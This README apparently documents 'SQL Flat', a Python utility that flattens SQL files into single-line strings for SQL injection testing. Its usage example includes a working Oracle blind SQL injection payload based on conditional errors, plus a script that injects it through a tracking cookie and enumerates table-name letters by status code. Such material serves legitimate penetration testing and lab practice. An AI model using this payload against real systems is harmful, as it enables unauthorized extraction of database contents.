# SQL Flat

SQL Flat is a Python utility for converting SQL queries to a single line string. This can be useful while testing for sql injection.

## Installation

You can install SQL Flat using `pip`:

```sh
pip install sqlflat
```

## Usage

To use SQL Parser, import the `sql_to_string` function:

```py
from sqlflat import sql_to_string
```

Then call the function with the path to the SQL file:

```py
query = sql_to_string('path/to/file.sql')
```

This will return the single line version of the SQL query as a string.

## Replacing variables
If you need to replace variables in the SQL query, you can do so using Python's string formatting syntax. For example, let's say you have a SQL query in select_empty_from_dual.sql that includes the variable @a:

```sql
-- Blind SQL injection with conditional errors
-- Throws an error if the variable @a is equal to the first letter of table_name
SELECT
    CASE
        WHEN LEFT(table_name, 1) = @a THEN TO_CHAR(1/0)
        ELSE  NULL
    END

FROM all_tables

WHERE ROWNUM = 1
```

You can replace the @a variable in your querry like so:

```py
#!/usr/bin/python3

import requests
from sqlflat import sql_to_string

for i in range(97,123):
    payload = sql_to_string("select_empty_from_dual.sql").replace('@a', '{}'.format(chr(i)))
    headers = {"Cookie": "TrackingId=0JzsmXsiTEOayV6o'||({})||'; session=CkRxbyf7MgZHJQjSFwTi7oQ1cBLGAgeY".format(payload)}
    r = requests.get('https:/example.com/', headers=headers)
    print("{} - {}".format(chr(i), r.status_code))
```

This code loads the SQL query from select_empty_from_dual.sql and replaces the @a variable with a letter from a to z using Python's chr() function.

## Contributing

If you find a bug or would like to suggest a new feature, please open an issue on the GitHub repository. Pull requests are also welcome!

## License

SQL Flat is licensed under the MIT License. See LICENSE for details.
